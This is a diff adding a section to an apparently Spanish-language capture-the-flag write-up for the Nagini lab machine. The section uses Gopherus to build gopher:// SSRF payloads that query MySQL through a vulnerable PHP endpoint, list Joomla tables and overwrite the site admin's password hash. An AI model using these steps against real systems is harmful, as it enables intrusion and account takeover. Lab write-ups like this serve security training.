@@ -22,8 +22,8 @@
   - [SSRF]()
 - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
   - [Gopherus]()
-- [Post-explotación](#post-explotación)
   - [Joomla]()
+- [Post-explotación](#post-explotación)
   - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
     - [Reverse Shell]()
   - [Recopilación de información](#recopilación-de-información-1)
@@ -116,9 +116,58 @@ Además también recopilamos que podria haber un archivo .bak, así que como sab
 
 En este archivo hemos encontrado que un usuario es **goblin**
 
+## Explotación de vulnerabilidades
+
+### Gopherus
+
 Después de mucha búsqueda y de alguna **hint** que me han dado, he encontrao una vulnerabilidad de **SSRF**
 
 > SSRF(Server-side Request Forgery) es una vulnerabilidad de seguridad web que permite a un atacante inducir a la aplicación del
 > lado del servidor a realizar solicitudes HTTP a un dominio arbitario de la elección del atacante.
+> Como ejemplo, el atacante puede hacer que el servidor se conecte a sí mismo.
 
+Lo siguiente es [instalarlo](https://github.com/tarunkant/Gopherus):
 
+```
+git clone https://github.com/tarunkant/Gopherus.git
+chmod +x gopherus.py
+./gopherus.py --exploit mysql
+```
+
+Ahora crearemos los payloads necesarios para conseguir nuestro objetivo:
+
+> **Iremos completando como esta escrito en los siguientes recuadros**
+
+```
+	Give MySQL username: goblin
+	Give query to execute: show databases;
+```
+
+El payload empieza con **gopher:** hasta que termina. 
+
+Este payload lo meteremos en la web ```http://quic.nagini.hogwarts/internalResourceFeTcher.php```
+
+> IMPORTANTE: Actualizar la página 5 vezes aproximadamente para que aparezca la query
+
+> ADEMÁS IR REPITIENDO LO MISMO EN CADA PASO HASTA TENER LA CONTRASEÑA DEL ADMIN DE JOOMLA
+
+```
+	Give MySQL username: goblin
+	Give query to execute: show * from joomla;
+```
+
+```
+	Give MySQL username: goblin
+	Give query to execute: use joomla; show tables;
+```
+
+```
+	Give MySQL username: goblin
+	Give query to execute: use joomla; select * from joomla_users;
+```
+
+```
+	Give MySQL username: goblin
+	Give query to execute: use joomla; update joomla_users set password='5f4dcc3b5aa765d61d8327deb882cf99' where email = 		'site_admin@nagini.hogwarts';
+```
+<img src="https://i.gyazo.com/56244fae80fb8c16a813a99b97a8b866.png">
